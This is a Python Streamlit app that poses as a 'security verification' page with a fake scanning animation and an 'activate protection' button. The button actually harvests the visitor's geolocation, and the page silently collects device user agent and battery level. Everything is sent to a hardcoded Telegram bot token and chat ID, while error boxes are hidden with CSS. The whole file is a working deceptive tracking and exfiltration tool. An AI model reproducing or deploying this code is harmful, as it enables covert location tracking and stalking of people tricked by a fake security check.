import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }

    /* A BARRA AMARELA QUE TU GOSTASTE */
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Bolha travada em 4% até o clique real
if 'pct' not in st.session_state: st.session_state['pct'] = 4

with caixa_bolha.container():
    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["pct"]}%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. CAPTURA SILENCIOSA (HARDWARE)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_BRAVO')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_BRAVO')

# 5. O SEGREDO: BOTÃO HTML QUE "GRITA" COM O NAVEGADOR
# Removi a alta precisão para forçar o pop-up simples de "Permitir"
js_funcional = """
<script>
function clicarBotao() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const dados = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'ok'};
            window.parent.postMessage({type: 'streamlit:set_component_value', value: dados}, '*');
        },
        (err) => { 
            console.log("Recusado");
            window.parent.postMessage({type: 'streamlit:set_component_value', value: 'erro'}, '*');
        },
        { enableHighAccuracy: false, timeout: 5000 }
    );
}
</script>
<button class="btn-barra" onclick="clicarBotao()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza a barra amarela como um componente HTML direto
res_gps = st.components.v1.html(js_funcional, height=80)

# 6. ANIMAÇÃO 0-100% E ENVIO
if res_gps and isinstance(res_gps, dict) and res_gps.get('status') == 'ok':
    # Agora sim, os números giram!
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    
    lat, lon = res_gps['lat'], res_gps['lon']
    mapa = f"https://www.google.com/maps?q={lat},{lon}"
    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
    st.success("Proteção Ativada!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
